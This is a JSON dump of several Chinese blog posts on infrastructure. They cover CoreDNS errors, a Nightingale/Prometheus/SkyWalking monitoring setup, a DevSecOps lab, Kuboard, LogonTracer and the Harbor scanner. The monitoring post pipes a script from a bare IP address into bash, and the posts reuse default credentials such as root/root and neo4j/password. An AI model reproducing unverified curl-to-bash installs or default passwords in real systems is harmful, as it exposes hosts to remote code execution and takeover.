-j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p tcp -s 169.254.25.10 --sport 8080 -j NOTRACK]&#125;  \n\ncluster.local.:53 on 169.254.25.10  \n\nin-addr.arpa.:53 on 169.254.25.10  \n\nip6.arpa.:53 on 169.254.25.10  \n\n.:53 on 169.254.25.10  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added interface - nodelocaldns  \n\n[INFO] plugin&#x2F;reload: Running configuration MD5 &#x3D; adf97d6b4504ff12113ebb35f0c6413e  \n\nCoreDNS-1.6.7  \n\nlinux&#x2F;amd64, go1.11.13,  \n\n[ERROR] plugin&#x2F;errors: 2 5032635697405930385.8744131853810691353.ip6.arpa. HINFO: dial tcp 10.233.0.3:53: connect: network is unreachable  \n\n[ERROR] plugin&#x2F;errors: 2 2703006067149038797.9108278204234463322.in-addr.arpa. HINFO: dial tcp 10.233.0.3:53: connect: network is unreachable  \n\n[ERROR] plugin&#x2F;errors: 2 4398450128437385198.8090046149832042955.cluster.local. HINFO: dial tcp 10.233.0.3:53: connect: network is unreachable  \n\n[ERROR] plugin&#x2F;errors: 2 localhost.weave.svc.cluster.local. A: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 localhost.weave.svc.cluster.local. AAAA: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 2703006067149038797.9108278204234463322.in-addr.arpa. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 5032635697405930385.8744131853810691353.ip6.arpa. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 4398450128437385198.8090046149832042955.cluster.local. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 localhost.weave.svc.cluster.local. A: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 localhost.weave.svc.cluster.local. AAAA: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 4398450128437385198.8090046149832042955.cluster.local. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 5032635697405930385.8744131853810691353.ip6.arpa. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 2703006067149038797.9108278204234463322.in-addr.arpa. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out\n解决方案修改nodelocaldns.yaml配置清单使用IPV6需要把 配置行 L70修改为： “health [__PILLAR__LOCAL__DNS__]:8080“。参加[[NodeLocalDNSCache]]\n参考K8S 中的 Grafana 数据持久化 - 耳东-Erdong - 博客园\n","slug":"DeepFlow","date":"2021-09-18T16:00:00.000Z","categories_index":"Cloud-Native","tags_index":"安装手册,DeepFlow,可观测性","author_index":"Moses"},{"id":"89d5cf8a319b3740168525b9ad32b4e4","title":"监控平台搭建","content":"前言   随着应用容器化和微服务的兴起，借由 Docker和 Kubernetes等工具，服务的快速开发和部署成为可能，构建微服务应用变得越来越简单。但是随着大型单体应用拆分为微服务，服务之间的依赖和调用变得极为复杂，这些服务可能是不同团队开发的，可能基于不同的语言，微服务之间可能是利用 RPC、RESTful API，也可能是通过消息队列实现调用或通讯。如何理清服务依赖调用关系、如何在这样的环境下快速 debug、追踪服务处理耗时、查找服务性能瓶颈、合理对服务的容量评估都变成一个棘手的事情。\nMetrices   产品功能对比\n\n\n\n对比项\nNightingale\nPrometheus\nZabbix\nSkywalking\n\n\n\n展示方面\n支持即时看板、监控大盘\n需要配合第三方展示工具、Grafana\n比较复古，不支持多个指标放到一张图里展示，不支持同环比等展示方式\n支持大屏看板，但是不太直观，较新\n\n\n易用性方面\n大部分操作都可在页面完成，兼用prometheus生态\n设计上偏工具，策略配置、采集配置都是编辑yaml文件，使用方便，需要二次深度包装\n\n\n\n\n业务监控\n数据结构灵活，支持SDK埋点、端上日志解析\n主要是SDK埋点方式，不支持日志解析，手段相对单一\nZabbix由于数据结构较为简单，不支持指标标签，业务指标聚合比较难搞\n\n\n\n运维体系\n完备的用户权限体系\n设计上偏工具，运维体系方面的设计考虑较少，需要二次深度包装\n\n\n\n\n报警方面\n生产级灵活，页面操作直接选择告警人和告警团队\n整体较为灵活，只是配置复杂，学习成本高，无页面支持，直接编辑yaml文件\n整体较为灵活，配置复杂，学习成本高\n\n\n\nTracing方案对比\n\n\n\n方案\nJaeger\nZipkin\nApache SkyWalking\nCAT\nPinpoint\nElastic APM\n\n\n\n开发语言\nGo\nJava\nJava\nJava\nJava\nGo\n\n\nGithub Star\n14.1k+\n14.6k+\n17.6k+\n15.8k+\n11.6k+\n400+\n\n\n背后组织\nCNCF Uber\nApache\nApache\n美团\nNAVER\nElastic\n\n\n\n\nTwitter\n\n\n\n\n\n\n侵入性\n中\n高\n低\n高\n低\n很低\n\n\nOpenTracing\n是\n是\n是\n否\n否\n不完善\n\n\n支持客户端\njava\njava\njava\njava\njava\ngo\n\n\n\ngo\ngo\n.net core\nc&#x2F;c++\nphp\njava\n\n\n\npython\npython\nnodejs\npython\n\nnodejs\n\n\n\nnodejs\nc#\nphp\nnodejs\n\npython\n\n\n\nc++&#x2F;c\nphp等\n\ngo\n\nruby\n\n\nUI丰富度\n中\n中\n较高\n高\n高\n中\n\n\n监控报警\n无，需要结合其他工具\n无，需要结合其他工具\n支持\n支持\n支持\n支持\n\n\n二次开发难度\n低\n中\n中\n高\n高\n高\n\n\n存储类型\nMemory\nMemory\nH2\nHDFS\nHBase\nElasticsearch\n\n\n\nCassandra\nCassandra\nElasticsearch\n\n\n\n\n\n\nElasticsearch\nElasticsearch\nMysql\n\n\n\n\n\n\nKafka\nMysql\nTiDB\n\n\n\n\n\n监控范围\n指标监控\n\n\n\n\n** 服务类型**\n服务名称\n监控项\n\n\n\n大数据\nElasticsearch\n包括集群&#x2F;索引&#x2F;节点等监控\n\n\n开发语言\nJVM\n包括 Heap&#x2F;thread&#x2F;gc&#x2F;cpu&#x2F;file 等监控\n\n\n中间件\nkafka\n包括 Broker&#x2F;topic&#x2F;consumer Group 等监控\n\n\n基础设施\nLinux\n包括 Cpu Api Server&#x2F;dns&#x2F;workload&#x2F;network 等监控\n\n\n\nKubernetes\nkubermetrics\n\n\n数据库\nMysql\n包括网络&#x2F;连接数&#x2F;慢查询等\n\n\n\nRedis\n包括内存使用率&#x2F;连接数&#x2F;命令执行情况等监控\n\n\n\nMongodb\n包括文档数&#x2F;读写性能&#x2F;网络流量等\n\n\n巡检\n健康巡检\n通过 Blackbox 定期对目标服务进行连通性测试，掌握服务的健康状况，及时发现异常\n\n\n\n应用性能观测\n\n痛点：随着业务不断发展，业务逻辑和服务调用日益复杂。导致应用性能问题分析与定位日益艰难，给监控运维带来了巨大的挑战：应用之间的依赖关系复杂，难以梳理。调用链路长，排查和定位群体困难。接口调用、数据库调用关系复杂，管理难度大。  \n\n解决方案：基于应用拓扑自助发现，定位性能瓶颈。基于关键性能指标对比，优化应用性能。根据指标变化趋势配置告警，及时了解异常。  \n\n前端性能监控主要关注用户页面性能（页面测速，接口测速，CDN 测速等）和质量（JS 错误，Ajax 错误等）\n\n\n服务器监控安装agentd访问地址： 夜莺 ，使用自己的OA账号直接登录  \n安装n9e-agentd（注意：服务器是centos7）\n&#96;curl -s http:&#x2F;&#x2F;116.85.64.82&#x2F;install_n9e_agentd.sh|bash\n通过下面命令查看n9e-agentd的进程，如果进程存在，说明启动成功如果启动失败，可通过journalctl -u n9e-agentd -f查看日志\nps -ef|grep n9e-agentd|grep -v grep\n安装完成之后 修改&#x2F;opt&#x2F;n9e&#x2F;agentd&#x2F;etc&#x2F;agentd.yaml中的服务端连接地址（搜索endpoint关键字），然后重启n9e-agentd即可\nvi &#x2F;opt&#x2F;n9e&#x2F;agentd&#x2F;etc&#x2F;agentd.yaml&#96;\n\n# 修改endpoint\nendpoints:\n  - http:&#x2F;&#x2F;metrics-monitor.ruijie.com.cn:8000\n  \n # 重启n9e-agentd\n systemctl restart n9e-agentd&#96; \n\n\n配置告警创建策略分组，然后在分组下新建告警策略  \n中间件监控访问地址： 夜莺 ，使用自己的OA账号直接登录  \n接入Mysql监控下载mysqld_exporter\n&#96;tar -xvf mysqld_exporter-0.13.0.linux-amd64.tar.gz\nmv mysqld_exporter-0.13.0.linux-amd64 mysqld_exporter\ncd mysqld_exporter\n# 创建mysql连接配置文件\n&#96;&#96;&#96;confid\nvi .my.cnf\n[client]\nhost&#x3D;127.0.0.1\nport&#x3D;3306\nuser&#x3D;root\npassword&#x3D;root\n\n# 创建 systemd unit 文件\n&#96;vi &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mysqld_exporter.service&#96;\n\n[Unit]\nDescription&#x3D;mysqld_exporter\nDocumentation&#x3D;https:&#x2F;&#x2F;prometheus.io&#x2F;\nAfter&#x3D;network.target\n\n[Service]\nType&#x3D;simple\nUser&#x3D;root\nExecStart&#x3D;&#x2F;home&#x2F;mysqld_exporter&#x2F;mysqld_exporter --config.my-cnf&#x3D;&#x2F;home&#x2F;mysqld_exporter&#x2F;.my.cnf\nRestart&#x3D;on-failure\n\n[Install]\nWantedBy&#x3D;multi-user.target&#96; \n启动服务\nsystemctl daemon-reload\nsystemctl enable mysqld_exporter.service\nsystemctl start mysqld_exporter.service\n运行状态\nsystemctl status mysqld_exporter.service\n\n正常起来后就可以访问http://IP:9104/metrics  \n配置Promethues Job1 创建mysql-exporter.json文件\n&#96;&#123;\n  &quot;ID&quot;: &quot;xxx-mysql-xx&quot;, &#x2F;&#x2F; 项目名-mysql-服务器ip\n  &quot;Name&quot;: &quot;xxx-mysql-xx&quot;,\n  &quot;Tags&quot;: [\n    &quot;mysql-exporter&quot; &#x2F;&#x2F; 类型\n  ],\n  &quot;Address&quot;: &quot;172.16.22.xxx&quot;, mysql服务器ip\n  &quot;Port&quot;: 9104, &#x2F;&#x2F; mysqld-exporter 暴露的端口\n  &quot;Meta&quot;: &#123;\n    &quot;app&quot;: &quot;ces-mysql-109&quot;,\n    &quot;team&quot;: &quot;tow_group&quot;,\n    &quot;project&quot;: &quot;ces&quot;\n  &#125;,\n  &quot;EnableTagOverride&quot;: false,\n  &quot;Check&quot;: &#123;\n    &quot;HTTP&quot;: &quot;http:&#x2F;&#x2F;172.16.22.109:9104&#x2F;metrics&quot;, &#x2F;&#x2F; mysqld-exporter 暴露的地址\n    &quot;Interval&quot;: &quot;10s&quot;\n  &#125;,\n  &quot;Weights&quot;: &#123;\n    &quot;Passing&quot;: 10,\n    &quot;Warning&quot;: 1\n  &#125;\n&#125;&#96; \n2 注册到consul中心  \ncurl --request PUT --data @mysql-exporter.json http:&#x2F;&#x2F;172.16.36.32:8500&#x2F;v1&#x2F;agent&#x2F;service&#x2F;register?replace-existing-checks&#x3D;1\n3 查看地址consul\n确认是否拉取到targetPromethues\n看板展示配置告警接入Redis监控接入ElasticSearch监控接入健康巡检配置Job修改配置文件，请提供项目的健康监测地址，如：https://www.ruijie.com.cn/demo/healthcheck，配置完成后即可在[Grafana](http://metrics-monitor.ruijie.com.cn:3000/d/xtkCtBkiz/jian-kang-xun-jian-da-ping-kan-ban?orgId=1&amp;refresh=10s)中查看  \n配置告警先创建策略分组，策略分组名称以（业务组-项目名称）命名 然后再当前策略分组下新建告警策略\n接入Spring Boot监控修改应用的依赖及配置步骤1：修改 pom 依赖项目中已经引用 spring-boot-starter-web 的基础上，在 pom.xml 文件中添加 actuator&#x2F;prometheus Maven 依赖项。\n&#96;&lt;dependency&gt;\n  &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;\n&lt;&#x2F;dependency&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;io.micrometer&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;micrometer-registry-prometheus&lt;&#x2F;artifactId&gt;\n&lt;&#x2F;dependency&gt;&#96; \n步骤2：修改配置编辑 resources 目录下的 application.yml 文件，修改 actuator 相关的配置来暴露 Prometheus 协议的指标数据。\n&#96;management:\n  endpoints:\n    web:\n      exposure:\n        include: prometheus  # 打开 Prometheus 的 Web 访问 Path\n  metrics:\n    # 下面选项建议打开，以监控 http 请求的 P99&#x2F;P95 等，具体的时间分布可以根据实际情况设置\n    distribution:\n      sla:\n        http:\n          server:\n            requests: 1ms,5ms,10ms,50ms,100ms,200ms,500ms,1s,5s\n    # 在 Prometheus 中添加特别的 Labels\n    tags:\n      # 必须加上对应的应用名，因为需要以应用的维度来查看对应的监控\n      application: spring-boot-mvc-demo&#96; \n步骤3：本地验证在项目当前目录下，运行 mvn spring-boot:run 之后，可以通过 http://localhost:8080/actuator/prometheus 访问到 Prometheus 协议的指标数据，说明相关的依赖配置已经正确。\n其他 Exporter 接入如果所使用的基础组件还没有提供相应的集成方式，可以参考如下方式进行集成，及自定义监控大屏来满足相应的监控需求。开源社区 Exporter 列表\n链路跟踪监控升级项目中的Dockerfile将 项目 &gt; docker &gt; Dockerfile 替换为以下内容，然后从新发布应用\nFROM  registry.choerodon.ruijie.com.cn&#x2F;cibase&#x2F;jdk:1.8.0-v5\n \nRUN mkdir -p &#x2F;usr&#x2F;local&#x2F;app \\\\\n    &amp;&amp; mkdir -p &#x2F;data&#x2F;logs \n\t\nCOPY  app.jar &#x2F;usr&#x2F;local&#x2F;app&#x2F;\n\nENV app_run_in_docker_registerport 80\n\nENV LANG C.UTF-8 \n\nEXPOSE 8080\nCMD [&quot;&#x2F;var&#x2F;java&#x2F;bin&#x2F;java&quot;,&quot;-Dserver.port&#x3D;8080&quot;,&quot;-jar&quot;,&quot;&#x2F;usr&#x2F;local&#x2F;app&#x2F;app.jar&quot;]\nCMD &#x2F;var&#x2F;java&#x2F;bin&#x2F;java -javaagent:&#x2F;usr&#x2F;local&#x2F;app&#x2F;skywalking_agent_zy&#x2F;skywalking-agent.jar -Dskywalking.agent.service_name&#x3D;$&#123;release&#125; -Dskywalking.collector.backend_service&#x3D;$&#123;sywalkingService&#125; -Dspring.profiles.active&#x3D;$&#123;env&#125; -Dserver.port&#x3D;8080 -jar &#x2F;usr&#x2F;local&#x2F;app&#x2F;app.jar&#96; \n服务查看进入 skywalking 查看监控状态\nk8s监控访问Grafana  \n前端监控Vue接入webfunny访问地址：前端监控\n添加平台用户\n自行注册\n\n添加监控探针 1、 在vue前端index.html中增加探针3、 探针地址改为\nhttps://captcha.ruijie.com.cn/webfunny/w.js \n4、 当然可以根据构建环境去添加探针\n&#96;&lt;% if (process.env.NODE_ENV !&#x3D;&#x3D; &#39;development&#39;) &#123; %&gt;      &lt;script&gt;      (function(f)&#123;var e&#x3D;f.sessionStorage;if(e)&#123;e.CUSTOMER_WEB_MONITOR_ID&#x3D;&quot;【探针ID】&quot;;var d&#x3D;document.createElement(&quot;script&quot;);d.async&#x3D;1;d.src&#x3D;&quot;https:&#x2F;&#x2F;captcha.ruijie.com.cn&#x2F;webfunny&#x2F;w.js&quot;;var g&#x3D;document.getElementsByTagName(&quot;script&quot;)[0];g.parentNode.insertBefore(d,g)&#125;&#125;)(window);      &lt;&#x2F;script&gt;     &lt;% &#125; %&gt;&#96; \n访问前端监控即可查看监控内容\n自定义指标告警自定义指标主动上报直接看使用curl命令上报数据的例子即可，如果是其他语言翻译一下就完了。监控指标组织为json list格式，放到http request body中，post给n9e-server即可。\n&#96;&#96;#!&#x2F;bin&#x2F;bash\n[[author]]:lixiang\n[[email]]:xiang_li@ruijie.com.cn\n\n[[http]]上报指标示例\n\nurl&#x3D;&quot;http:&#x2F;&#x2F;metrics-monitor.ruijie.com.cn:8000&#x2F;v1&#x2F;n9e&#x2F;push&quot;   # 请求接口\nmetric&#x3D;&quot;mysql_back_status&quot;        # 指标名称\nvalue&#x3D;1                   # 值\ntimestamp&#x3D;&#96;date +%s&#96;      # 时间戳\n\n#请求参数\nbody&#x3D;&#39;[&#123;\n  &quot;metric&quot;: &quot;&#39;$&#123;metric&#125;&#39;&quot;,\n  &quot;value&quot;: &#39;$&#123;value&#125;&#39;,\n  &quot;tags&quot;: &#123;\n            &quot;system-name&quot;: &quot;ecp&quot;\n        &#125;,\n  &quot;time&quot;: &#39;$&#123;timestamp&#125;&#39;\n&#125;]&#39;\n\necho -e &quot;请求参数:\\n $body \\n\\n返回结果:&quot;\n&#96;&#96;&#96;sh\n#发送请求\ncurl -X POST &quot;$url&quot; \\\n    -H &#39;Content-Type: application&#x2F;json&#39; \\\n    -d &quot;$body&quot;&#96;&#96; \n其中各个字段的含义参考《 「DataModel」- https://n9e.didiyun.com/docs/appendix/datamodel/ 》一章，ident、alias字段是可选的，很多情形的监控数据是没法和设备关联在一起的，比如某个域名的证书过期时间，这种监控数据就可以不传ident、alias字段。  \n配置告警上一步中我们自定义了一个指标为mysql_back_status，然后在告警策略中定义  \n未来规划\n高可用\n动态化导入job\n告警规则\n\nhttphttps://grafana.com/grafana/dashboards/7587\nmysql\n【END】\n","slug":"监控平台","date":"2021-09-10T16:00:00.000Z","categories_index":"Cloud-Native","tags_index":"DeepFlow,可观测性,skywalking","author_index":"Moses"},{"id":"b970fe5bee1957a85fe7360386c990fe","title":"通过自建DevSecOps环境学习","content":"前导知识\n版本控制系统：Git Jenkins    \n持续集成与持续交付：CI&#x2F;CD \n制品仓库管理：Artifactory、Nexus\nIaC，基础设施管理配置管理工具\n公有云私有云相关技术组件\n\nDevSecOps平台搭建DevSecOps-StudioDevSecOps-Studio包含的技术组件选型主要有： \n\n\n\n&lt;类型&gt;\n&lt;组件工具&gt;\n\n\n\n渗透测试\nNmap, Metasploit\n\n\n静态检测\nBrakeman, bandit, findbugs\n\n\n动态检测\nZAP proxy, Gaunlt\n\n\n基线加固\nDevSec Ansible OS Hardening\n\n\n合规检测\nInspec\n\n\n操作系统\nUbuntu Xenial (16.04)\n\n\n开发语言\nJava, Python 3, Ruby&#x2F;Rails\n\n\n容器化技术\nDocker\n\n\n源码管理\nGitlab\n\n\nCI服务\nGitlab CI&#x2F;Jenkins\n\n\n配置管理\nAnsible\n\n\n安全监控\nELK\n\n\n公有云\nAWS CLI\n\n\n其他工具\nGit, Vim, curl, wget\n\n\n常见工具链选型参考\nDevSecOps安装Require   \n\nVagrant       \nVirtualbox       \nAnsibleDependenciesbrew install vagrant\nbrew install virtualbox\nbrew install ansible\nInstallation$ git clone https:&#x2F;&#x2F;github.com&#x2F;hysnsec&#x2F;DevSecOps-Studio.git\n$ cd DevSecOps-Studio &amp;&amp; vagrant status\n$ ansible-galaxy install -r requirements.yml\nvagrant up\nQ&#x2F;AQ1#homebrew安装ansible失败\nexport HOMEBREW_BOTTLE_DOMAIN&#x3D;&#39;&#39; #临时修改去掉国内的镜像设置: 在 Terminal 中输入下面的命令即可.\n写入zsh的~&#x2F;.zprofile文件source后永久生效\nQ2#Vagrant使用国内镜像安装镜像box失败\nvagrant init centos7 https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;centos-cloud&#x2F;centos&#x2F;7&#x2F;vagrant&#x2F;x86_64&#x2F;images&#x2F;CentOS-7.box #使用中科大镜像站\n\nDevSecOps平台使用前导工具使用Vagrant命令\nvagrant init      # 初始化\nvagrant up        # 启动虚拟机\nvagrant halt      # 关闭虚拟机\nvagrant reload    # 重启虚拟机\nvagrant ssh       # SSH 至虚拟机\nvagrant suspend   # 挂起虚拟机\nvagrant resume    # 唤醒虚拟机\nvagrant status    # 查看虚拟机运行状态\nvagrant destroy   # 销毁当前虚拟机\nvagrant provision #任务是预先设置的一些操作指令 &#96;vagrant provision --provision-with shell&#96;\n[[box]]管理命令\nvagrant box list    # 查看本地box列表\nvagrant box add     # 添加box到列表\nvagrant box remove  # 从box列表移除 \n设置CI&#x2F;CDpipeline\n- 1.创建项目：Repo by URL 或者本地使用git push\n- 2.项目地址：https:&#x2F;&#x2F;github.com&#x2F;secfigo&#x2F;django.nV.git\n- 3.setup CI&#x2F;CD\nstages:\n  - build\n  - test\n  - deploy\n\nbuild:\n  stage: build\n  script:\n    - echo &quot;This is a build step&quot;\n\ntest:\n  stage: test\n  script:\n    - echo &quot;This is a test step&quot;\n\ndeploy:\n  stage: deploy\n  script:\n    - echo &quot;This is a deploy step&quot;\n\n","slug":"通过自建DevSecOps环境学习","date":"2021-08-20T06:20:21.000Z","categories_index":"DevSecOps","tags_index":"CI/CD,Jenkins,DevSecOps,实验环境,Vagrant","author_index":"Moses"},{"id":"f443264b00bffe4f0b17c0513a02db89","title":"Kubernetes学习笔记 -- kubeadm-ha安装集群","content":"在K8S 中安装 Kuboard v3方法一：使用 hostPath 提供持久化安装1.执行 Kuboard v3 在 K8S 中的安装\nkubectl apply -f https:&#x2F;&#x2F;addons.kuboard.cn&#x2F;kuboard&#x2F;kuboard-v3.yaml\n# 您也可以使用下面的指令，唯一的区别是，该指令使用华为云的镜像仓库替代 docker hub 分发 Kuboard 所需要的镜像\n# kubectl apply -f https:&#x2F;&#x2F;addons.kuboard.cn&#x2F;kuboard&#x2F;kuboard-v3-swr.yaml\n2.等待 Kuboard v3 就绪\n[root@node1 ~]# kubectl get pods -n kuboard\nNAME                               READY   STATUS    RESTARTS   AGE\nkuboard-agent-2-65bc84c86c-r7tc4   1&#x2F;1     Running   2          28s\nkuboard-agent-78d594567-cgfp4      1&#x2F;1     Running   2          28s\nkuboard-etcd-fh9rp                 1&#x2F;1     Running   0          67s\nkuboard-etcd-nrtkr                 1&#x2F;1     Running   0          67s\nkuboard-etcd-ader3                 1&#x2F;1     Running   0          67s\nkuboard-v3-645bdffbf6-sbdxb        1&#x2F;1     Running   0          67s\n3.访问Kuboard\n\n在浏览器中打开链接 http://your-node-ip-address:30080\n输入初始用户名和密码，并登录 admin Kuboard1234.卸载kubectl delete -f https:&#x2F;&#x2F;addons.kuboard.cn&#x2F;kuboard&#x2F;kuboard-v3.yaml\n5.清理遗留数据在 master 节点以及带有 k8s.kuboard.cn&#x2F;role&#x3D;etcd 标签的节点上执行rm -rf &#x2F;usr&#x2F;share&#x2F;kuboard\n\n","slug":"Kuboard","date":"2021-08-15T16:00:00.000Z","categories_index":"Cloud-Native","tags_index":"Kubernetes,k8s-dashboard,Docker,kuboard","author_index":"Moses"},{"id":"ad55f03212de97d27b0493e8951fccaf","title":"Docker安装LogonTracer","content":"LogonTracer介绍LogonTracer：是一款用于可视化分析Windows安全事件日志寻找恶意登录的工具。它会将登录相关事件中找到的主机名（或IP地址）和帐户名称关联起来，并将其以图形化的方式展现出来。通过这种方式，可以看到哪个帐户中发生过登录尝试以及哪个主机被使用。基于此研究，该工具可以可视化与Windows登录相关的下列事件ID。\n4624：登录成功\n \n4625：登录失败\n \n4768：Kerberos身份验证（TGT请求）\n \n4769：Kerberos服务票据（ST请求）\n \n4776：NTLM身份验证\n \n4672：分配特殊权限\n\n2 互动(键盘和屏幕的登录系统)\n \n3 网络(即连接到共享文件夹从其他地方在这台电脑上网络)\n \n4 批处理(即计划任务)\n \n5 服务(服务启动)\n \n7 解锁密码保护屏幕保护程序(即unnattended工作站)\n \n8 NetworkCleartext(登录凭据发送明文。通常表示与“基本身份验证”登录到IIS)\n \n9 NewCredentials如RunAs或映射网络驱动器替代凭证。这个登录类型似乎并没有出现在任何事件。\n \n10 RemoteInteractive(终端服务,远程桌面或远程协助)\n \n11 CachedInteractive(与缓存域登录凭证时登录一台笔记本电脑等远离网络)\n作用LogonTracer使用 PageRank和ChangeFinder从事件日志中检测恶意主机和帐户。使用LogonTracer，也可以按时间顺序显示事件日志。\n搭建1.拉取镜像文件\ndocker pull jpcertcc&#x2F;docker-logontracer\n2.运行镜像\ndocker run --detach --publish&#x3D;7474:7474 --publish&#x3D;7687:7687 --publish&#x3D;8080:8080 -e LTHOSTNAME&#x3D;172.17.190.98 jpcertcc&#x2F;docker-logontracer\n3.修改项目前端问题\n#1.编辑镜像模板文件\ndocker exec -it 349d &#x2F;bin&#x2F;sh\n&#x2F;var&#x2F;lib&#x2F;neo4j# vi &#x2F;usr&#x2F;local&#x2F;src&#x2F;LogonTracer&#x2F;templates&#x2F;index.html\n#2.替换国内JS源文件\nhttps:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;3.2.1&#x2F;jquery.min.js -&gt; 替换成https:&#x2F;&#x2F;ajax.loli.net&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;3.2.1&#x2F;jquery.min.js\n#3.若还有JS资源问题如cdnjs.cloudflare.com等可使用猫云搜索对应JS并替换。\n#4.重启容器\ndocker restart id [[容器ID]]\n4.本地通过Python脚本导入文件\ndocker cp &#x2F;home&#x2F;issue_38.evtx c0384389919d:&#x2F;usr&#x2F;local&#x2F;src&#x2F;LogonTracer #拷贝文件到容器内\ncd &#x2F;usr&#x2F;local&#x2F;src&#x2F;LogonTracer &amp;&amp; python3 logontracer.py --delete -e log.evtx -u neo4j -p password #本地导入文件\n5.Neo4J数据库\nhttp:&#x2F;&#x2F;localhost:7474 #地址\n账号：neo4j\n密码：password\n6.docker操作\n1）commit的错误操作\ndocker commit c0384389919d jpcertcc&#x2F;docker-logontracer-v2 [[commit]]\ndocker commit 后无法删除原有镜像文件，查看image的父images命令：\ndocker image inspect --format&#x3D;&#39;&#123;&#123;.RepoTags&#125;&#125; &#123;&#123;.Id&#125;&#125; &#123;&#123;.Parent&#125;&#125;&#39; $(docker image ls -q --filter since&#x3D;子镜像id)\n2）镜像保存后导出导入\ndocker save jpcertcc&#x2F;docker-logontracer&#x2F;root&#x2F;home&#x2F;jpcertcc.tar\ndocker load&lt;jpcertcc.tar\n3)容器内安装工具\napt-get install -y net-tools #网络工具\napt-get install -y vim #编辑工具\napt-get update &amp;&amp; apt-get install procps #进程管理工具\n4)手动启动web\npython3 logontracer.py -r -o 8080 -u neo4j -p password -s localhost\n资源链接猫云github地址neo4j文档   \n","slug":"Docker安装LogonTracer","date":"2021-07-28T09:13:17.000Z","categories_index":"应急响应","tags_index":"日志分析,应急响应","author_index":"Moses"},{"id":"4a5feac766d456074a0922c23a83b4df","title":"容器安全平台-Habor-Scanner","content":"Harbor-Scanner一个免费的镜像漏洞扫描工具, 可以扫描镜像中已安装软件包的漏洞，支持中文漏洞库，可与 Harbor 无缝集成。\n\n\n\n\n\n\n\n\n\nDosec 的商业客户可以使用企业版扫描功能，例如扫描开源框架中的漏洞以及扫描容器镜像中包含的敏感数据。同时企业版增加了WEB UI, 提供仪表板，资产管理，用户管理，镜像漏洞修复建议, 安全和策略评估报告，容器运行时防护，Docker 和 Kubernetes 合规检查以及其他功能和模块。\n特点\n漏洞扫描快速准确，支持CVE和CNNVD双漏洞编号，漏洞中文描述信息\n自动更新漏洞库(在配置中开启自动更新参数)\n快速部署使用，最新的发布版中已包含最近日期之前的全量漏洞库，安装完成即可立即扫描出结果\n\n安装推荐将 Harbor-Scanner 和 Harbor 镜像仓库部署在同一台服务器。\n\n下载 Harbor-Scanner 的离线安装包并解压\n wget https:&#x2F;&#x2F;github.com&#x2F;dosec-cn&#x2F;harbor-scanner&#x2F;releases&#x2F;download&#x2F;v1.2&#x2F;dosec-scanner.tgz\n# 解压\ntar zxf dosec-scanner.tgz\n# 进入项目\ncd dosec-scanner\n\n运行 Install 脚本\n\n\n\n\n\n\n\n\n\n需要提前安装 docker-compose\n .&#x2F;Install.sh\n\n配置 Harbor 仓库\n 登录 Harbor 管理界面 -&gt; 审查服务 -&gt; 扫描器 -&gt; 新建扫描器\n \n 填写扫描器配置 -&gt; 点击 ADD 确认添加\n \n ① 填写扫描工具的名称\n ② 填写扫描工具的 IP 和端口\n ③ 测试 Harbor 和扫描工具是否能正常连接\n ④ 只有测试连接成功后才能添加\n\n\n自定义配置可根据需要更改 docker-compose.yaml 文件\nversion: &#39;2.2&#39;\n\nservices:\n  dosec-db-hb:\n    image: hub.dosec.cn&#x2F;library&#x2F;dosec-db-hb:2021-04-06T14.21.24\n    restart: always\n\n  dosec-scannerapp:\n    depends_on:\n      - dosec-db-hb\n    image: hub.dosec.cn&#x2F;library&#x2F;dosec-scannerapp:2021-04-02T19.42.13V1.0.0_prod\n    # 默认映射了主机的 8899 端口\n    ports:\n      - &quot;8899:8899&quot;\n    restart: always\n    # 默认将程序日志映射到了主机的 &#x2F;var&#x2F;log&#x2F;dosec-scanner 目录\n    volumes:\n      - &#x2F;var&#x2F;log&#x2F;dosec-scanner:&#x2F;dosec&#x2F;log\n\n  dosec-scanner-hb:\n    depends_on:\n      - dosec-db-hb\n      - dosec-scannerapp\n    image: hub.dosec.cn&#x2F;library&#x2F;dosec-scanner-hb:2021-04-02T17.07.22V1.2_release\n    # command: [&quot;-update_cve&quot;]\n    # 默认注释了在线更新 CVE 功能, 会消耗大量 CPU 和内存\n    restart: always\n    # 默认将程序日志映射到了主机的 &#x2F;var&#x2F;log&#x2F;dosec-scanner 目录\n    volumes:\n      - &#x2F;var&#x2F;log&#x2F;dosec-scanner:&#x2F;dosec&#x2F;log\n\n卸载进入 Harbor-Scanner 项目目录, 执行以下命令即可完全卸载\ndocker-compose down\n\n支持扫描的操作系统\nDebian &gt;&#x3D; 7, unstable\nUbuntu LTS releases &gt;&#x3D; 12.04\nRed Hat Enterprise Linux &gt;&#x3D; 5\nCentOS &gt;&#x3D; 5\nAlpine &gt;&#x3D; 3.3\nOracle Linux &gt;&#x3D; 5\n\nDosec 安全产品对比\n\n\n功能\nHarbor-Scanner\n镜界容器安全防护平台\n\n\n\n许可\n免费\n企业版\n\n\n支持与 